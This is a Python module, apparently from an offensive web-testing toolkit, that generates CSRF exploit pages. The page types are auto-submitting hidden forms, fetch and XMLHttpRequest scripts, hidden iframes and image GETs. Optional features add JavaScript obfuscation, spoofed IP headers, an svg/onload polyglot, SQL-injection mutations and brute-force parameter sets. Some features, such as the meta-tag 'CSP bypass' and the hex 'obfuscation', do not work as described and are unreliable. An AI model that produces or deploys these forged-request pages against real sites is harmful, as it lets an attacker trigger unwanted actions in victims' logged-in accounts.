import os
from colorama import Fore, Style
from core.utils import guardar_resultado
import random
import string
import urllib.parse
import base64

def generar_exploit_csrf(
    nombre_archivo, 
    metodo, 
    url, 
    parametros, 
    tipo, 
    output=None, 
    silent=False, 
    headers=None, 
    content_type="application/x-www-form-urlencoded",
    comentario=None,
    js_callback=None,
    multi_param_sets=None,  # lista de dicts de parámetros
    randomize_params=False,
    delay_ms=None,
    resumen_log=None,
    custom_payloads=None,  # dict: tipo -> template string
    return_payloads=False,
    print_payload=False,
    postprocess_callback=None,
    param_encoding=None,  # None, 'url', 'base64'
    param_transform=None,  # función(parametros_dict) -> dict
    payload_validator=None,  # función(payload_str) -> bool
    save_as_txt=False,
    extra_payloads=None,  # lista de strings de payloads extra a guardar
    before_save_callback=None,  # función(fname, payload) -> (fname, payload)
    brute_force_values=None,  # dict: param -> lista de valores para fuerza bruta
    advanced_mutations=False,  # genera mutaciones automáticas de payloads
    obfuscate_js=False,  # ofusca el JS generado
    anti_csp_bypass=False,  # intenta bypass de CSP
    include_polyglot=False,  # incluye payloads polyglot
    aggressive_headers=False  # añade headers agresivos
):
    payload = ""
    headers = headers or {}

    # Comentario opcional en el payload
    comentario_str = f"<!-- {comentario} -->\n" if comentario else ""

    # Headers personalizados para fetch/XMLHttpRequest
    headers_str = ""
    if headers:
        headers_str = ",\n    ".join([f'"{k}": "{v}"' for k, v in headers.items()])
    else:
        headers_str = f'"Content-Type": "{content_type}"'

    def encode_value(val):
        if param_encoding == "url":
            return urllib.parse.quote_plus(str(val))
        elif param_encoding == "base64":
            return base64.b64encode(str(val).encode()).decode()
        return val

    def randomize_value(val):
        if isinstance(val, str):
            return val + ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        return val

    def render_param(v):
        v = v.format(**parametros) if "{" in v and "}" in v else v
        if randomize_params:
            v = randomize_value(v)
        v = encode_value(v)
        return v

    def build_payload(parametros_actuales):
        # Payload personalizado por tipo
        if custom_payloads and tipo in custom_payloads:
            return custom_payloads[tipo].format(
                url=url,
                metodo=metodo.upper(),
                params="&".join([f"{k}={render_param(v)}" for k,v in parametros_actuales.items()]),
                comentario=comentario_str,
                headers=headers_str,
                js_callback=js_callback or "",
                delay=delay_ms or "",
                parametros=parametros_actuales
            )
        if tipo == "auto-submit-form":
            return f'''{comentario_str}<html>
  <body onload="document.forms[0].submit()">
    <form action="{url}" method="{metodo.upper()}">
{"".join([f'      <input type="hidden" name="{k}" value="{render_param(v)}"/>\n' for k,v in parametros_actuales.items()])}    </form>
  </body>
</html>'''
        elif tipo == "fetch":
            js_cb = f"\n{js_callback}" if js_callback else ""
            delay = f"setTimeout(function(){{\n" if delay_ms else ""
            delay_end = f"}}, {delay_ms});" if delay_ms else ""
            return f'''{comentario_str}<html><body>
<script>
{delay}fetch("{url}", {{
  method: "{metodo.upper()}",
  headers: {{
    {headers_str}
  }},
  body: "{'&'.join([f'{k}={render_param(v)}' for k,v in parametros_actuales.items()])}"
}});{js_cb}{delay_end}
</script>
</body></html>'''
        elif tipo == "xmlhttprequest":
            js_cb = f"\n{js_callback}" if js_callback else ""
            delay = f"setTimeout(function(){{\n" if delay_ms else ""
            delay_end = f"}}, {delay_ms});" if delay_ms else ""
            return f'''{comentario_str}<html><body>
<script>
{delay}var xhr = new XMLHttpRequest();
xhr.open("{metodo.upper()}", "{url}", true);
xhr.setRequestHeader("Content-Type", "{content_type}");
xhr.send("{'&'.join([f'{k}={render_param(v)}' for k,v in parametros_actuales.items()])}");{js_cb}{delay_end}
</script>
</body></html>'''
        elif tipo == "iframe":
            return f'''{comentario_str}<iframe srcdoc='<form action="{url}" method="{metodo.upper()}">
{"".join([f'<input type="hidden" name="{k}" value="{render_param(v)}"/>' for k,v in parametros_actuales.items()])}
<input type="submit" value="Submit" />
</form>' style="display:none;"></iframe>'''
        elif tipo == "img-get":
            if metodo.upper() != "GET":
                if not silent:
                    print(f"{Fore.YELLOW}[!] El exploit de tipo 'img-get' solo es válido con el método GET.{Style.RESET_ALL}")
                return None
            query = '&'.join([f'{k}={render_param(v)}' for k, v in parametros_actuales.items()])
            return f'''{comentario_str}<img src="{url}?{query}" style="display:none"/>'''
        elif tipo == "multipart-form":
            boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            body = ""
            for k, v in parametros_actuales.items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{render_param(v)}\r\n"
            body += f"--{boundary}--\r\n"
            return f'''{comentario_str}<html><body>
<script>
var xhr = new XMLHttpRequest();
xhr.open("{metodo.upper()}", "{url}", true);
xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary={boundary}");
xhr.send(`{body}`);
</script>
</body></html>'''
        elif tipo == "json":
            js_cb = f"\n{js_callback}" if js_callback else ""
            delay = f"setTimeout(function(){{\n" if delay_ms else ""
            delay_end = f"}}, {delay_ms});" if delay_ms else ""
            json_body = "{" + ", ".join([f'"{k}": "{render_param(v)}"' for k, v in parametros_actuales.items()]) + "}"
            return f'''{comentario_str}<html><body>
<script>
{delay}fetch("{url}", {{
  method: "{metodo.upper()}",
  headers: {{
    {headers_str},
    "Content-Type": "application/json"
  }},
  body: JSON.stringify({json_body})
}});{js_cb}{delay_end}
</script>
</body></html>'''
        elif tipo == "plain-text":
            text_body = "\\n".join([f"{k}={render_param(v)}" for k, v in parametros_actuales.items()])
            return f"{comentario_str}{text_body}"
        else:
            if not silent:
                print(f"{Fore.RED}[!] Tipo de exploit CSRF no reconocido: {tipo}{Style.RESET_ALL}")
            return None

    def obfuscate_javascript(js):
        if not obfuscate_js:
            return js
        # Simple JS obfuscation (hex encoding)
        return ''.join(['\\x{:02x}'.format(ord(c)) for c in js])

    def add_aggressive_headers(hs):
        if not aggressive_headers:
            return hs
        hs = dict(hs)
        hs["X-Requested-With"] = "XMLHttpRequest"
        hs["X-Forwarded-For"] = "127.0.0.1"
        hs["X-Originating-IP"] = "127.0.0.1"
        hs["X-Remote-IP"] = "127.0.0.1"
        hs["X-Remote-Addr"] = "127.0.0.1"
        hs["Referer"] = url
        return hs

    def csp_bypass_snippet():
        if not anti_csp_bypass:
            return ""
        # Simple CSP bypass trick (may not always work)
        return '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\' \'unsafe-eval\' data: blob:;">'

    def polyglot_payload():
        if not include_polyglot:
            return ""
        # Simple HTML/JS polyglot
        return "<svg/onload=alert(1)><!--"

    def brute_force_param_sets(base_params):
        if not brute_force_values:
            return [base_params]
        from itertools import product
        keys = list(brute_force_values.keys())
        values = list(brute_force_values.values())
        combos = list(product(*values))
        sets = []
        for combo in combos:
            p = dict(base_params)
            for i, k in enumerate(keys):
                p[k] = combo[i]
            sets.append(p)
        return sets

    payloads = []
    # Brute force param sets si corresponde
    param_sets = multi_param_sets if multi_param_sets else [parametros]
    if brute_force_values:
        brute_sets = []
        for base in param_sets:
            brute_sets.extend(brute_force_param_sets(base))
        param_sets = brute_sets

    for idx, param_set in enumerate(param_sets):
        # Transformación de parámetros si se solicita
        if param_transform:
            param_set = param_transform(param_set)
        # Headers agresivos si corresponde
        hs = add_aggressive_headers(headers or {})
        headers_str = ",\n    ".join([f'"{k}": "{v}"' for k, v in hs.items()]) if hs else f'"Content-Type": "{content_type}"'
        # Polyglot y CSP bypass
        polyglot = polyglot_payload()
        csp_bypass = csp_bypass_snippet()
        # Mutaciones avanzadas
        mutation_payloads = []
        if advanced_mutations:
            # Ejemplo: mutar parámetros con valores especiales
            for k in param_set:
                mutated = dict(param_set)
                mutated[k] = f"{param_set[k]}' OR '1'='1"
                mutation_payloads.append(mutated)
        all_param_sets = [param_set] + mutation_payloads if advanced_mutations else [param_set]
        for param_set_variant in all_param_sets:
            payload = build_payload(param_set_variant)
            # Ofuscar JS si corresponde
            if obfuscate_js and payload and "<script>" in payload:
                parts = payload.split("<script>")
                if len(parts) > 1:
                    js_code = parts[1].split("</script>")[0]
                    obf_js = obfuscate_javascript(js_code)
                    payload = payload.replace(js_code, obf_js)
            # Inyectar polyglot y CSP bypass si corresponde
            if payload:
                if csp_bypass:
                    payload = csp_bypass + payload
                if polyglot:
                    payload = polyglot + payload
            # Validación de payload si se solicita
            if payload_validator and payload and not payload_validator(payload):
                if not silent:
                    print(f"{Fore.YELLOW}[!] Payload no válido, omitido.")
                continue
            fname = nombre_archivo if len(param_sets) == 1 else f"{os.path.splitext(nombre_archivo)[0]}_{idx+1}.html"
            # Callback antes de guardar (permite modificar fname/payload)
            if before_save_callback:
                fname, payload = before_save_callback(fname, payload)
            if payload:
                try:
                    with open(fname, "w", encoding="utf-8") as f:
                        f.write(payload)
                    if save_as_txt:
                        txt_fname = fname.replace(".html", ".txt")
                        with open(txt_fname, "w", encoding="utf-8") as ftxt:
                            ftxt.write(payload)
                    if print_payload:
                        print(f"\n--- Payload generado para {fname} ---\n{payload}\n")
                    if not silent:
                        print(f"{Fore.GREEN}[+] Exploit CSRF generado: {fname}{Style.RESET_ALL}")
                    guardar_resultado(output, f"[CSRF] Exploit generado: {fname}")
                    payloads.append(payload)
                    if postprocess_callback:
                        postprocess_callback(fname, payload)
                except Exception as e:
                    if not silent:
                        print(f"{Fore.RED}[!] Error al guardar el archivo: {e}{Style.RESET_ALL}")
    # Guardar payloads extra si se proporcionan
    if extra_payloads:
        for i, extra in enumerate(extra_payloads):
            fname = f"{os.path.splitext(nombre_archivo)[0]}_extra_{i+1}.html"
            # Permitir callback antes de guardar payload extra
            if before_save_callback:
                fname, extra = before_save_callback(fname, extra)
            try:
                with open(fname, "w", encoding="utf-8") as f:
                    f.write(extra)
                if save_as_txt:
                    txt_fname = fname.replace(".html", ".txt")
                    with open(txt_fname, "w", encoding="utf-8") as ftxt:
                        ftxt.write(extra)
                if print_payload:
                    print(f"\n--- Payload extra generado para {fname} ---\n{extra}\n")
                if not silent:
                    print(f"{Fore.GREEN}[+] Payload extra generado: {fname}{Style.RESET_ALL}")
                guardar_resultado(output, f"[CSRF] Payload extra generado: {fname}")
                payloads.append(extra)
                if postprocess_callback:
                    postprocess_callback(fname, extra)
                # Generar variantes ultra agresivas del payload extra
                if advanced_mutations:
                    # Variante con doble encoding
                    encoded = base64.b64encode(extra.encode()).decode()
                    fname_encoded = fname.replace(".html", "_b64.html")
                    with open(fname_encoded, "w", encoding="utf-8") as fenc:
                        fenc.write(encoded)
                    if print_payload:
                        print(f"\n--- Payload extra (base64) generado para {fname_encoded} ---\n{encoded}\n")
                    if not silent:
                        print(f"{Fore.GREEN}[+] Payload extra (base64) generado: {fname_encoded}{Style.RESET_ALL}")
                    payloads.append(encoded)
                if obfuscate_js and "<script>" in extra:
                    parts = extra.split("<script>")
                    if len(parts) > 1:
                        js_code = parts[1].split("</script>")[0]
                        obf_js = obfuscate_javascript(js_code)
                        obf_payload = extra.replace(js_code, obf_js)
                        fname_obf = fname.replace(".html", "_obf.html")
                        with open(fname_obf, "w", encoding="utf-8") as fobf:
                            fobf.write(obf_payload)
                        if print_payload:
                            print(f"\n--- Payload extra (obfuscated) generado para {fname_obf} ---\n{obf_payload}\n")
                        if not silent:
                            print(f"{Fore.GREEN}[+] Payload extra (obfuscated) generado: {fname_obf}{Style.RESET_ALL}")
                        payloads.append(obf_payload)
                # Variante ultra agresiva: combinación de mutaciones, encoding y polyglot
                if advanced_mutations and include_polyglot:
                    poly_obf = "<svg/onload=alert(1)><!--" + base64.b64encode(extra.encode()).decode()
                    fname_poly = fname.replace(".html", "_polyglot.html")
                    with open(fname_poly, "w", encoding="utf-8") as fpoly:
                        fpoly.write(poly_obf)
                    if print_payload:
                        print(f"\n--- Payload extra (polyglot+base64) generado para {fname_poly} ---\n{poly_obf}\n")
                    if not silent:
                        print(f"{Fore.GREEN}[+] Payload extra (polyglot+base64) generado: {fname_poly}{Style.RESET_ALL}")
                    payloads.append(poly_obf)
                # Variante ultra agresiva: inyección de múltiples técnicas en un solo payload
                if advanced_mutations and anti_csp_bypass:
                    csp_poly = '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\' \'unsafe-eval\' data: blob:;">' + extra
                    fname_csp = fname.replace(".html", "_cspbypass.html")
                    with open(fname_csp, "w", encoding="utf-8") as fcsp:
                        fcsp.write(csp_poly)
                    if print_payload:
                        print(f"\n--- Payload extra (CSP bypass) generado para {fname_csp} ---\n{csp_poly}\n")
                    if not silent:
                        print(f"{Fore.GREEN}[+] Payload extra (CSP bypass) generado: {fname_csp}{Style.RESET_ALL}")
                    payloads.append(csp_poly)
            except Exception as e:
                if not silent:
                    print(f"{Fore.RED}[!] Error al guardar el payload extra: {e}{Style.RESET_ALL}")
    # Guardar resumen de exploits generados
    if resumen_log and payloads:
        try:
            with open(resumen_log, "a", encoding="utf-8") as logf:
                for idx, payload in enumerate(payloads):
                    fname = nombre_archivo if len(payloads) == 1 else f"{os.path.splitext(nombre_archivo)[0]}_{idx+1}.html"
                    logf.write(f"{fname}\n")
        except Exception as e:
            if not silent:
                print(f"{Fore.RED}[!] Error al guardar el resumen: {e}{Style.RESET_ALL}")
    if return_payloads:
        return payloads